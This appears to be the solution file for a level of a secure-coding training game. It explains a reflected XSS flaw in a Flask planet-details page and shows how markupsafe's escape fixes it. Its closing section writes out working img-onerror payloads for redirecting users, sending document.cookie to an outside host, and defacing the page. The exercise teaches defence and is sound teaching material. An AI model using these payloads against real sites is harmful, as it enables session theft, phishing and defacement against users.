# Contribute new levels to the game in 3 simple steps!
# Read our Contribution Guideline at github.com/skills/secure-code-game/blob/main/CONTRIBUTING.md

This code is vulnerable to Cross-Site Scripting (XSS).

Learn more about Cross-Site Scripting (XSS): https://portswigger.net/web-security/cross-site-scripting
Example from a security advisory: https://securitylab.github.com/advisories/GHSL-2023-084_Pay/ 

Why the index() function it vulnerable to XSS?

Firstly, the user input is not sanitized.
Then, an anti-XSS defense is implemented, preventing inputs with the 'script' tag. 
However, other tags, such as the 'img' tag, can still be used to exploit a XSS bug as follows:

Exploit: 
<img src="x" onerror="alert(1)">
 
Explanation: 
With this payload, the XSS attack will execute successfully, since it will force the browser to open an 
alert dialog box.

How can we fix this?
We can use the function 'escape', which is a built-in function inside the markup module used by Flask. 
This function helps to escape special characters in the input, preventing them from being executed
as HTML or JavaScript.

Example: 
from markupsafe import escape

return f'<h2>Planet Details:</h2><p>{escape(get_planet_info(planet))}</p>'
 
What else can XSS do?
- Steal cookies and session information
- Redirect to malicious websites
- Modify website content
- Phishing
- Keylogging

How to prevent XSS?
- Sanitize user input properly
- Use Content Security Policy (CSP)
- Use HttpOnly Cookies
- Use X-XSS-Protection header

Here are some exploit examples:

- Redirect to phishing page using XSS:
<img src="x" onerror="window.location.href = 'https://google.com';">

- Get cookies:
<img src="x" onerror="window.location.href = 'https://google.com/?cookie=' + document.cookie;">

- Modify website content:
You can inject any phishing page, malicious page, or any other content to the website using XSS, by:
<img src="x" onerror="document.body.innerHTML = '<h1>Website is hacked</h1>';">